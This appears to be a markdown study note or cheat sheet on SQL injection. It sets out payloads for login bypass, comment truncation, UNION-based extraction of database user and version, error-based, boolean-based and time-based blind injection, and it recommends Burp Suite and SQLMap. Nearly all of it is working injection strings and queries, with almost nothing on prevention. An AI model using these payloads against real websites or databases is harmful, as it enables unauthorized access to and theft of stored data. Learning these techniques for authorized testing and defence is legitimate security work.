# SQL INJECTION

This part shows examples of the most used sql commands injection used to find vulnerabilities to websites or databases.

1. Get whatever user

    ```SQL
    >sabar" or "1"="1"
    >basal" or "1"="1"
    <> select * from login where user="sabar" or "1"="1" and password="basal" or "1"="1"
    # Returns first person logged or account
    ```

2. Get user, and ignore parts or code

    ```SQL
    after: ;
    use: -- # /* - 
    select * from login where user="jonh" or "1"="1"; --and password="pass";
    select * from login where user="jonh" or "1"="1"; # and password="pass";
    select * from login where user="jonh" or "1"="1";-- - and password="pass";
    select * from login where user="jonh" or "1"="1"; /* and password="pass";
        after this close with */
    ```

3. Take atention to single quotes or double quotes

    ```SQL
    select * from login where user='jonh' or 1=1;#
    in a form insert: ' or 1=1:#
    ```

4. Get information from the information_schema database
5. Know the SQL Language or database in the backend with 'select database();'

## Union base SQL-I

use the keyword union in your SQL injection to get information from the database:

**example:** union select user(),database(),version();
this will return the username, database and version from the backend

1. get the number or columns in a table

    suppous a select statement like next:

    ```SQL
    select * from carts;
    # in your browser or form write
    order by 10; -- and you will be able to know if the request in the backend has 10 columns or workaround to figure it out
    order by 15; -- make a range between both to know how many columns are in the record
    ```

    after know how manu columns are in the request of a component, start getting the data from the database

    ```SQL
    -- the numbers of column have to match with the columns in the backend, if not will show an error
    union select user(),database(),version(),4,5,6,9;

    ```

## Error SQL-I

Depends in the product or database system

1. returns data from the database, like this version, database name, user or user admin the database.

    **only works for version 5.7.--**

    ```SQL
    -- in your sql-i insert:
    or 1=1 group by round(rand(0)) having min(0)#
    -- it will return an error
    select name, round(rand(0)) from users group by round(rand(0)) having min(0);
    -- get data in sql
    select name from users group by concat(round(rand(0)), user(), database(), /* whatever */) having min(0);
    ```

## Boolean SQL-I

Use "and" and "or" operators to execute code in the backend or database

1. using "or" "and" operators

    ```SQL
    -- the SQL-I starts after the or/and
    select * from users where name="jonh" or database() like '%a%'
    -- will return all records even if name is not correct, it will look if the database uses an 'a' in the database name

    -- get the length of the database's name
    select * from users where name="jonh" or length(database())=2;
    -- even if the name is correct
    ```

## Time Based SQL-I

Use the function sleep(n) **depends on the database system**
and calculate the time that takes to answer to check if your condition is true or false

1. get database information

    ```SQL
    -- use or/and depending in the SQL-I
    -- it will takes 5 seconds if there is a 'j' in the database's name
    select * from users where name="jo" or if(database()like'%j%', sleep(5), sleep(2));
    -- and of can get more data, like the size of the database's name
    select * from users where name="jo" or if(length(database()) = 2, sleep(5), sleep(2));
    ```

## Tools to Test SQL-I and automated testing

You can use tools available all over the internet but here's a recommended one:
[Burp Suite](https://portswigger.net/burp), which allows in semi-automated test:

1. Automated dynamic scanning
2. Enhanced manual testing

--

Another one is [SQLMap](https://sqlmap.org/) which is full automated tests
visit its website and learn how to use it, it's large and offers many options.
